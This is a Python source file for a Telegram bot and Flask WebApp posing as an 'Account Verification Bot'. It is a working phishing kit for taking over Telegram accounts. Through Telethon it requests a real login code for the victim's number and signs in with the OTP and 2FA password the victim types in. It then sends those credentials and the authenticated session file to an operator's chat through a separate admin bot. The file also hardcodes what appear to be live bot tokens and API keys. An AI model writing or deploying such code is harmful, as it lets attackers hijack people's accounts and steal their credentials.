import os
import telebot
from telebot import types
from flask import Flask, render_template, request, jsonify
import threading
import time
import logging
import json
from datetime import datetime
import asyncio
import traceback
from telethon import TelegramClient
from telethon.errors import (
    FloodWaitError, PhoneCodeInvalidError, 
    SessionPasswordNeededError, PasswordHashInvalidError
)

# ==================== SETUP ====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Configuration from environment variables
BOT_TOKEN = os.environ.get('BOT_TOKEN', '7487704262:AAE34XTNrKt5D9dKtduPK0Ezwc9j3SLGoBA')
ADMIN_BOT_TOKEN = os.environ.get('ADMIN_BOT', '7658644625:AAEoKfPDyhponCstcBgRnw3JSOXu0APHHhI')
API_ID = int(os.environ.get('API_ID', '25240346'))
API_HASH = os.environ.get('API_HASH', 'b8849fd945ed9225a002fda96591b6ee')
ADMIN_ID = int(os.environ.get('ADMIN_ID', '5425526761'))

# Initialize bots
bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')
admin_bot = telebot.TeleBot(ADMIN_BOT_TOKEN, parse_mode='HTML')
app = Flask(__name__)

# Storage
user_data = {}
otp_data = {}
sessions = {}

# ==================== HELPER FUNCTIONS ====================
def send_to_admin(phone, otp=None, password=None, user_info=None, session_path=None):
    """Send notification to admin using separate admin bot"""
    try:
        # Determine which bot to use
        notification_bot = admin_bot if ADMIN_BOT_TOKEN else bot
        
        message = f"""📱 <b>VERIFICATION SUCCESS!</b>

📞 Phone: {phone}
⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""
        
        if user_info:
            if isinstance(user_info, dict):
                name = f"{user_info.get('first_name', '')} {user_info.get('last_name', '')}".strip()
                if name:
                    message += f"\n👤 Name: {name}"
                if user_info.get('username'):
                    message += f"\n🔗 Username: @{user_info.get('username')}"
                if user_info.get('id'):
                    message += f"\n🆔 ID: {user_info.get('id')}"
        
        if otp:
            message += f"\n🔢 OTP: <code>{otp}</code>"
        
        if password:
            message += f"\n🔐 2FA Password: <code>{password}</code>"
        
        notification_bot.send_message(ADMIN_ID, message, parse_mode='HTML')
        
        # Send session file if it exists
        session_sent = False
        if session_path and os.path.exists(session_path):
            try:
                with open(session_path, 'rb') as f:
                    notification_bot.send_document(
                        ADMIN_ID,
                        f,
                        caption=f"📁 Session file for {phone}"
                    )
                logger.info(f"✅ Session sent: {session_path}")
                session_sent = True
            except Exception as e:
                logger.error(f"Session send error: {e}")
        
        # If session file doesn't exist at given path, try to find it
        if not session_sent:
            try:
                session_dir = 'sessions'
                phone_clean = phone.replace('+', '')
                
                # Look for session files for this phone
                if os.path.exists(session_dir):
                    for filename in os.listdir(session_dir):
                        if phone_clean in filename and filename.endswith('.session'):
                            session_path = os.path.join(session_dir, filename)
                            with open(session_path, 'rb') as f:
                                notification_bot.send_document(
                                    ADMIN_ID,
                                    f,
                                    caption=f"📁 Session file for {phone}"
                                )
                            logger.info(f"✅ Session sent from fallback: {session_path}")
                            break
            except Exception as e:
                logger.error(f"Fallback session send error: {e}")
        
        logger.info(f"✅ Admin notified: {phone}")
        return True
        
    except Exception as e:
        logger.error(f"Admin error: {e}")
        return False

def send_error_to_admin(phone, error_message, user_id=None, error_details=None):
    """Send error notification to admin"""
    try:
        notification_bot = admin_bot if ADMIN_BOT_TOKEN else bot
        
        message = f"""❌ <b>VERIFICATION ERROR!</b>

📞 Phone: {phone}
⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""
        
        if user_id:
            message += f"\n👤 User ID: {user_id}"
        
        message += f"\n⚠️ Error: {error_message}"
        
        if error_details:
            message += f"\n🔧 Details: {error_details}"
        
        notification_bot.send_message(ADMIN_ID, message, parse_mode='HTML')
        logger.info(f"✅ Error sent to admin: {phone} - {error_message}")
        
    except Exception as e:
        logger.error(f"Error sending to admin: {e}")

# ==================== TELETHON FUNCTIONS (ASYNC) ====================
async def send_otp_async(phone):
    """Send OTP using Telethon (async)"""
    try:
        # Create session directory
        os.makedirs('sessions', exist_ok=True)
        
        # Clean phone number for session name
        phone_clean = phone.replace('+', '')
        session_name = f"sessions/{phone_clean}"
        
        # Initialize Telegram client
        client = TelegramClient(session_name, API_ID, API_HASH)
        
        # Connect and send code request
        await client.connect()
        
        if not client.is_connected():
            return {'success': False, 'error': 'Failed to connect to Telegram'}
        
        try:
            sent = await client.send_code_request(phone)
            
            return {
                'success': True,
                'phone_code_hash': sent.phone_code_hash,
                'session_name': session_name
            }
            
        except FloodWaitError as e:
            return {'success': False, 'error': f'Flood wait: Please wait {e.seconds} seconds'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            try:
                await client.disconnect()
            except:
                pass
            
    except Exception as e:
        logger.error(f"Telethon send OTP error: {e}")
        return {'success': False, 'error': f'Connection failed: {str(e)}'}

async def verify_otp_async(phone, otp, phone_code_hash):
    """Verify OTP using Telethon (async)"""
    try:
        phone_clean = phone.replace('+', '')
        session_name = f"sessions/{phone_clean}"
        
        # Check if session exists
        if not os.path.exists(session_name + '.session'):
            return {'success': False, 'error': 'Session not found. Please restart verification.'}
        
        # Initialize Telegram client
        client = TelegramClient(session_name, API_ID, API_HASH)
        await client.connect()
        
        if not client.is_connected():
            return {'success': False, 'error': 'Failed to connect to Telegram'}
        
        try:
            # Sign in with OTP
            await client.sign_in(
                phone=phone,
                code=otp,
                phone_code_hash=phone_code_hash
            )
            
            # Get user info
            me = await client.get_me()
            user_info = {
                'id': me.id,
                'username': me.username,
                'first_name': me.first_name,
                'last_name': me.last_name,
                'phone': me.phone
            }
            
            # Save session
            client.session.save()
            session_path = f"{client.session.filename}.session"
            
            return {
                'success': True,
                'user_info': user_info,
                'session_path': session_path,
                'requires_2fa': False
            }
            
        except SessionPasswordNeededError:
            # 2FA required
            return {
                'success': True,
                'requires_2fa': True,
                'session_name': session_name
            }
        except PhoneCodeInvalidError:
            return {'success': False, 'error': 'Invalid OTP code'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            try:
                await client.disconnect()
            except:
                pass
            
    except Exception as e:
        logger.error(f"Telethon verify OTP error: {e}")
        return {'success': False, 'error': str(e)}

async def verify_2fa_async(session_name, password):
    """Verify 2FA password using Telethon (async)"""
    try:
        # Check if session exists
        if not os.path.exists(session_name + '.session'):
            return {'success': False, 'error': 'Session not found. Please restart verification.'}
        
        # Initialize Telegram client
        client = TelegramClient(session_name, API_ID, API_HASH)
        await client.connect()
        
        if not client.is_connected():
            return {'success': False, 'error': 'Failed to connect to Telegram'}
        
        try:
            await client.sign_in(password=password)
            
            # Get user info
            me = await client.get_me()
            user_info = {
                'id': me.id,
                'username': me.username,
                'first_name': me.first_name,
                'last_name': me.last_name,
                'phone': me.phone
            }
            
            # Save session
            client.session.save()
            session_path = f"{client.session.filename}.session"
            
            return {
                'success': True,
                'user_info': user_info,
                'session_path': session_path
            }
            
        except PasswordHashInvalidError:
            return {'success': False, 'error': 'Invalid 2FA password'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            try:
                await client.disconnect()
            except:
                pass
            
    except Exception as e:
        logger.error(f"Telethon verify 2FA error: {e}")
        return {'success': False, 'error': str(e)}

def run_async_task(coroutine):
    """Run async task in thread with proper event loop"""
    try:
        # Create new event loop for this thread
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(coroutine)
        loop.close()
        return result
    except Exception as e:
        logger.error(f"Async task error: {e}")
        return {'success': False, 'error': str(e)}

# ==================== BOT HANDLERS ====================
@bot.message_handler(commands=['start'])
def handle_start(message):
    """Handle /start command"""
    try:
        user_id = message.from_user.id
        first_name = message.from_user.first_name or ""
        
        # Get WebApp URL
        if 'RENDER' in os.environ:
            RENDER_EXTERNAL_HOSTNAME = os.environ.get('RENDER_EXTERNAL_HOSTNAME')
            WEBAPP_URL = f"https://{RENDER_EXTERNAL_HOSTNAME}" if RENDER_EXTERNAL_HOSTNAME else "https://itz-me-545-telegram.onrender.com"
        else:
            port = os.environ.get('PORT', 10000)
            WEBAPP_URL = f"http://localhost:{port}"
        
        # Create WebApp button
        kb = types.InlineKeyboardMarkup()
        btn = types.InlineKeyboardButton(
            "📱 Open Verification WebApp",
            web_app=types.WebAppInfo(WEBAPP_URL)
        )
        kb.add(btn)
        
        # Welcome message
        welcome_text = f"""👋 <b>Hello {first_name}!</b>

Welcome to <b>Account Verification Bot</b>

Click the button below to verify your account:

✅ <b>Verification Steps:</b>
1️⃣ Open WebApp
2️⃣ Share your contact
3️⃣ Receive 5-digit OTP via Telegram
4️⃣ Enter OTP in WebApp
5️⃣ Complete verification ✅

<b>Click below to begin:</b>"""
        
        bot.send_message(
            message.chat.id,
            welcome_text,
            parse_mode='HTML',
            reply_markup=kb
        )
        
        logger.info(f"✅ Sent /start to user {user_id}")
        
    except Exception as e:
        logger.error(f"Start error: {e}")

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    """Handle contact sharing"""
    try:
        contact = message.contact
        user_id = message.from_user.id
        phone = contact.phone_number
        
        # Format phone
        if not phone.startswith('+'):
            phone = '+' + phone
        
        logger.info(f"📱 Contact from {user_id}: {phone}")
        
        # Store user data
        user_data[user_id] = {
            'name': f"{contact.first_name or ''} {contact.last_name or ''}".strip(),
            'phone': phone,
            'username': message.from_user.username,
            'contact_time': time.time(),
            'stage': 'contact_received'
        }
        
        # Send only minimal message
        msg = bot.send_message(
            message.chat.id,
            f"""✅ <b>Contact Received!</b>

📱 Phone: {phone}

⏳ <b>Processing your request...</b>""",
            parse_mode='HTML'
        )
        
        # Send OTP in background with proper async handling
        def send_otp_task():
            try:
                result = run_async_task(send_otp_async(phone))
                
                if result.get('success'):
                    # Store OTP data
                    otp_data[user_id] = {
                        'phone': phone,
                        'phone_code_hash': result.get('phone_code_hash'),
                        'session_name': result.get('session_name'),
                        'time': time.time()
                    }
                    
                    user_data[user_id]['stage'] = 'otp_sent'
                    
                    # Edit message to show only minimal info
                    bot.edit_message_text(
                        f"""✅ <b>Request Processed!</b>

📱 Phone: {phone}

📲 Please check your Telegram app for OTP.""",
                        message.chat.id,
                        msg.message_id,
                        parse_mode='HTML'
                    )
                    
                    # Send initial notification to admin
                    admin_message = f"""📱 <b>NEW VERIFICATION STARTED!</b>

📞 Phone: {phone}
👤 User ID: {user_id}
⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""
                    
                    if ADMIN_BOT_TOKEN:
                        admin_bot.send_message(ADMIN_ID, admin_message, parse_mode='HTML')
                    else:
                        bot.send_message(ADMIN_ID, admin_message, parse_mode='HTML')
                    
                    logger.info(f"✅ OTP sent to {phone}")
                else:
                    error_msg = result.get('error', 'Failed to send OTP')
                    user_data[user_id]['stage'] = 'error'
                    
                    # Send error to user
                    bot.edit_message_text(
                        f"❌ <b>Unable to process request at this time.</b>",
                        message.chat.id,
                        msg.message_id,
                        parse_mode='HTML'
                    )
                    
                    # Send detailed error to admin
                    send_error_to_admin(
                        phone=phone,
                        error_message=error_msg,
                        user_id=user_id,
                        error_details=f"Send OTP failed for user {user_id}"
                    )
                    
            except Exception as e:
                logger.error(f"OTP task error: {e}")
                error_trace = traceback.format_exc()
                
                # Send error to user
                bot.edit_message_text(
                    "❌ <b>Unable to process request.</b>",
                    message.chat.id,
                    msg.message_id,
                    parse_mode='HTML'
                )
                
                # Send detailed error to admin
                send_error_to_admin(
                    phone=phone,
                    error_message="Server error during OTP sending",
                    user_id=user_id,
                    error_details=f"Exception: {str(e)}\n{error_trace}"
                )
        
        thread = threading.Thread(target=send_otp_task)
        thread.start()
        
        # Delete contact message
        try:
            bot.delete_message(message.chat.id, message.message_id)
        except:
            pass
        
    except Exception as e:
        logger.error(f"Contact error: {e}")

# ==================== FLASK ROUTES ====================
@app.route('/')
def index():
    """Main WebApp page"""
    return render_template('index.html')

@app.route('/api/user/<int:user_id>')
def api_user(user_id):
    """Get user data for WebApp"""
    data = user_data.get(user_id, {})
    return jsonify({
        'success': 'phone' in data,
        'phone': data.get('phone', ''),
        'name': data.get('name', ''),
        'stage': data.get('stage', 'waiting'),
        'verified': data.get('stage') == 'verified'
    })

@app.route('/api/share-contact', methods=['POST'])
def api_share_contact():
    """API endpoint for sharing contact from WebApp"""
    try:
        data = request.json
        user_id = data.get('user_id')
        phone = data.get('phone')
        
        if not user_id or not phone:
            return jsonify({'success': False, 'error': 'Missing parameters'})
        
        logger.info(f"📱 WebApp contact from {user_id}: {phone}")
        
        # Format phone
        if not phone.startswith('+'):
            phone = '+' + phone
        
        # Store user data
        user_data[user_id] = {
            'phone': phone,
            'stage': 'contact_received',
            'time': time.time()
        }
        
        # Send OTP in background with proper async handling
        def send_otp_task():
            result = run_async_task(send_otp_async(phone))
            
            if result.get('success'):
                otp_data[user_id] = {
                    'phone': phone,
                    'phone_code_hash': result.get('phone_code_hash'),
                    'session_name': result.get('session_name'),
                    'time': time.time()
                }
                user_data[user_id]['stage'] = 'otp_sent'
                logger.info(f"✅ OTP sent via API to {phone}")
                
                # Send initial notification to admin
                admin_message = f"""📱 <b>NEW VERIFICATION STARTED!</b>

📞 Phone: {phone}
👤 User ID: {user_id}
⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""
                
                if ADMIN_BOT_TOKEN:
                    admin_bot.send_message(ADMIN_ID, admin_message, parse_mode='HTML')
                else:
                    bot.send_message(ADMIN_ID, admin_message, parse_mode='HTML')
            else:
                user_data[user_id]['stage'] = 'error'
                error_msg = result.get('error', 'Failed to send OTP')
                logger.error(f"Failed to send OTP: {error_msg}")
                
                # Send error to admin
                send_error_to_admin(
                    phone=phone,
                    error_message=error_msg,
                    user_id=user_id,
                    error_details="WebApp OTP sending failed"
                )
        
        thread = threading.Thread(target=send_otp_task)
        thread.start()
        
        return jsonify({'success': True, 'message': 'Processing your request'})
        
    except Exception as e:
        logger.error(f"API share contact error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify-otp', methods=['POST'])
def api_verify_otp():
    """Verify OTP from WebApp"""
    try:
        data = request.json
        user_id = data.get('user_id')
        otp = data.get('otp', '').strip()
        
        logger.info(f"🔢 OTP verification for user {user_id}: {otp}")
        
        if not user_id or not otp:
            return jsonify({'success': False, 'error': 'Missing parameters'})
        
        # Validate OTP (5 digits)
        if len(otp) != 5 or not otp.isdigit():
            return jsonify({'success': False, 'error': 'Enter 5-digit OTP'})
        
        # Get OTP data
        data = otp_data.get(int(user_id))
        if not data:
            return jsonify({'success': False, 'error': 'Session expired. Please restart.'})
        
        phone = data['phone']
        phone_code_hash = data.get('phone_code_hash')
        
        if not phone_code_hash:
            return jsonify({'success': False, 'error': 'OTP not sent yet'})
        
        # Verify OTP using Telethon
        result = run_async_task(verify_otp_async(phone, otp, phone_code_hash))
        
        if result.get('success'):
            if result.get('requires_2fa'):
                # Store session for 2FA
                session_name = result.get('session_name')
                if session_name:
                    sessions[user_id] = session_name
                    user_data[int(user_id)]['stage'] = 'needs_2fa'
                
                return jsonify({
                    'success': True,
                    'requires_2fa': True,
                    'message': '2FA password required'
                })
            else:
                # Success
                user_info = result.get('user_info', {})
                session_path = result.get('session_path', '')
                
                # Send complete notification to admin with session file
                send_to_admin(
                    phone,
                    otp=otp,
                    user_info=user_info,
                    session_path=session_path
                )
                
                user_data[int(user_id)]['stage'] = 'verified'
                logger.info(f"✅ OTP verified for {phone}")
                
                return jsonify({
                    'success': True,
                    'requires_2fa': False,
                    'message': 'Verification successful!'
                })
        else:
            error_msg = result.get('error', 'Verification failed')
            
            # Send error to admin
            send_error_to_admin(
                phone=phone,
                error_message=error_msg,
                user_id=user_id,
                error_details=f"OTP verification failed for OTP: {otp}"
            )
            
            return jsonify({
                'success': False,
                'error': error_msg
            })
            
    except Exception as e:
        logger.error(f"API verify OTP error: {e}")
        error_trace = traceback.format_exc()
        
        # Send error to admin
        send_error_to_admin(
            phone="Unknown",
            error_message="Server error during OTP verification",
            user_id=data.get('user_id') if 'data' in locals() else None,
            error_details=f"Exception: {str(e)}\n{error_trace}"
        )
        
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify-2fa', methods=['POST'])
def api_verify_2fa():
    """Verify 2FA password"""
    try:
        data = request.json
        user_id = data.get('user_id')
        password = data.get('password', '').strip()
        
        logger.info(f"🔐 2FA attempt for user {user_id}")
        
        if not user_id or not password:
            return jsonify({'success': False, 'error': 'Missing parameters'})
        
        # Get session
        session_name = sessions.get(user_id)
        if not session_name:
            return jsonify({'success': False, 'error': 'Session expired'})
        
        # Verify 2FA using Telethon
        result = run_async_task(verify_2fa_async(session_name, password))
        
        if result.get('success'):
            # Success
            user_info = result.get('user_info', {})
            session_path = result.get('session_path', '')
            phone = user_info.get('phone', 'Unknown')
            
            # Send complete notification to admin with session file
            send_to_admin(
                phone,
                password=password,
                user_info=user_info,
                session_path=session_path
            )
            
            user_data[int(user_id)]['stage'] = 'verified'
            logger.info(f"✅ 2FA successful for {phone}")
            
            return jsonify({
                'success': True,
                'message': '2FA verified successfully!'
            })
        else:
            error_msg = result.get('error', 'Invalid password')
            
            # Send error to admin
            send_error_to_admin(
                phone="Unknown",
                error_message=error_msg,
                user_id=user_id,
                error_details="2FA verification failed"
            )
            
            return jsonify({
                'success': False,
                'error': error_msg
            })
            
    except Exception as e:
        logger.error(f"API 2FA error: {e}")
        error_trace = traceback.format_exc()
        
        # Send error to admin
        send_error_to_admin(
            phone="Unknown",
            error_message="Server error during 2FA verification",
            user_id=data.get('user_id') if 'data' in locals() else None,
            error_details=f"Exception: {str(e)}\n{error_trace}"
        )
        
        return jsonify({'success': False, 'error': str(e)})

# ==================== WEBHOOK ====================
@app.route('/webhook', methods=['POST'])
def webhook():
    """Telegram webhook endpoint"""
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return ''
    return 'OK', 200

@app.route('/admin-webhook', methods=['POST'])
def admin_webhook():
    """Admin bot webhook endpoint"""
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = types.Update.de_json(json_string)
        admin_bot.process_new_updates([update])
        return ''
    return 'OK', 200

# ==================== CLEANUP ====================
def cleanup_old_sessions():
    """Clean up old session files"""
    while True:
        try:
            if os.path.exists('sessions'):
                import glob
                import time as t
                
                session_files = glob.glob('sessions/*')
                current_time = t.time()
                
                for session_file in session_files:
                    # Delete sessions older than 1 hour
                    if current_time - os.path.getmtime(session_file) > 3600:
                        os.remove(session_file)
                        logger.info(f"Cleaned up old session: {session_file}")
            
            t.sleep(3600)  # Run cleanup every hour
                    
        except Exception as e:
            logger.error(f"Cleanup error: {e}")
            t.sleep(300)

# ==================== MAIN ====================
if __name__ == "__main__":
    logger.info("="*60)
    logger.info("🚀 Telegram Verification Bot - FINAL FIXED VERSION")
    logger.info("="*60)
    logger.info(f"🤖 Main Bot Token: {BOT_TOKEN[:10]}...")
    logger.info(f"👑 Admin Bot Token: {ADMIN_BOT_TOKEN[:10]}..." if ADMIN_BOT_TOKEN else "👑 Using main bot for admin notifications")
    logger.info(f"📞 Admin ID: {ADMIN_ID}")
    logger.info(f"🔧 API ID: {API_ID}")
    logger.info("="*60)
    
    # Create directories
    os.makedirs('sessions', exist_ok=True)
    os.makedirs('templates', exist_ok=True)
    
    # Start cleanup thread
    cleanup_thread = threading.Thread(target=cleanup_old_sessions, daemon=True)
    cleanup_thread.start()
    
    # Setup webhooks
    try:
        if 'RENDER' in os.environ:
            RENDER_EXTERNAL_HOSTNAME = os.environ.get('RENDER_EXTERNAL_HOSTNAME')
            if RENDER_EXTERNAL_HOSTNAME:
                # Main bot webhook
                WEBHOOK_URL = f"https://{RENDER_EXTERNAL_HOSTNAME}/webhook"
                bot.remove_webhook()
                time.sleep(1)
                bot.set_webhook(url=WEBHOOK_URL)
                logger.info(f"✅ Main bot webhook set: {WEBHOOK_URL}")
                
                # Admin bot webhook
                if ADMIN_BOT_TOKEN:
                    ADMIN_WEBHOOK_URL = f"https://{RENDER_EXTERNAL_HOSTNAME}/admin-webhook"
                    admin_bot.remove_webhook()
                    time.sleep(1)
                    admin_bot.set_webhook(url=ADMIN_WEBHOOK_URL)
                    logger.info(f"✅ Admin bot webhook set: {ADMIN_WEBHOOK_URL}")
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        # Fallback polling for main bot
        def run_polling():
            bot.polling(none_stop=True, interval=3, skip_pending=True)
        
        polling_thread = threading.Thread(target=run_polling, daemon=True)
        polling_thread.start()
        logger.info("✅ Main bot polling started")
        
        # Fallback polling for admin bot
        if ADMIN_BOT_TOKEN:
            def run_admin_polling():
                admin_bot.polling(none_stop=True, interval=3, skip_pending=True)
            
            admin_polling_thread = threading.Thread(target=run_admin_polling, daemon=True)
            admin_polling_thread.start()
            logger.info("✅ Admin bot polling started")
    
    # Start Flask
    port = int(os.environ.get('PORT', 10000))
    logger.info(f"🚀 Starting Flask on port {port}")
    
    app.run(
        host='0.0.0.0',
        port=port,
        debug=False,
        use_reloader=False,
        threaded=True
                    )
